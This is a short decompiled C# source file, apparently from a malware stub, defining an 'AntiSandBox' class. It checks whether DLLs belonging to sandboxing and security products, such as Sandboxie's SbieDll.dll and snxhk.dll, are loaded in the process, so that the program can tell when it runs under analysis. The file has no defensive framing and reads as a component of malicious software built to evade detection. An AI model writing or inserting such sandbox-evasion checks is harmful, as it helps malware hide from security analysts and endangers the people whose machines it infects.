using System;
using Stub.Helper.CryptString;

namespace Stub.Helper
{
	// Token: 0x02000006 RID: 6
	public class AntiSandBox
	{
		// Token: 0x0600000A RID: 10 RVA: 0x000027C8 File Offset: 0x000009C8
		public static bool Check()
		{
			string[] array = new string[]
			{
				"SbieDll.dll",
				"SxIn.dll",
				"Sf2.dll",
				"snxhk.dll",
				"cmedvrt32.dll"
			};
			for (int i = 0; i < array.Length; i++)
			{
				if (DllImport.GetModuleHandleA(array[i]) != 0)
				{
					return true;
				}
			}
			return false;
		}
	}
}
